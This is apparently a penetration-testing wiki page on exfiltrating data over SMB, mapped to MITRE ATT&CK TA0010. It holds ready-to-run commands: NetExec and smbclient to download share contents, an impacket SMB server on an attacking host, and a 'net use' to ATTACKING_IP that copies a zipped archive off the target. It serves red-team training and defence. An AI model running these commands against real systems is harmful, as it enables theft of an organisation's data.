---
description: MITRE ATT&CK™ - Exfiltration - Tactic TA0010
---

# Over SMB

## Theory

SMB (Server Message Block) exfiltration refers to the unauthorized extraction or transfer of data from a compromised network or system using SMB protocols. Attackers can leverage SMB to transfer sensitive or valuable information from an organization's network to an external location.

## Practice

### Exfiltrate Share's Content

{% tabs %}
{% tab title="NetExec" %}
Tools like [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to recursively download a SMB share's content.

```bash
netexec smb $IP -u $USERNAME -p $PASSWORD -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=999999
```

The previous command generates a json file with the list of accessible files in shares. We may use jq to parse this json output.

```bash
cat 10.10.10.111.json | jq '. | map_values(keys)'
```
{% endtab %}

{% tab title="smbclient" %}
Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) can be used to recursively download a SMB share's content.

```bash
# In an smbclient interactive session
recurse ON
prompt OFF
mget *
```
{% endtab %}
{% endtabs %}

### Exfiltrate Data

{% tabs %}
{% tab title="Windows" %}
To exfiltrate the data from the target, we can compress the data and transfer it via an SMB shared folder hosted on our attacking host.

First, start a SMB server on your attacking host using [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from impacket

```bash
smbserver.py -smb2support /local/share/path ShareName -user veresk -password psswd
```

On the target, compress target data

```powershell
Compress-Archive -Path /path/to/compress -DestinationPath exfi.zip
```

From the target, mount the share folder and copy files to it

```powershell
# Mount the smb share
net use Z: \\ATTACKING_IP\ShareName psswd /USER:veresk

# Exfiltrate ZIP file
copy exfi.zip Z:\
```
{% endtab %}
{% endtabs %}
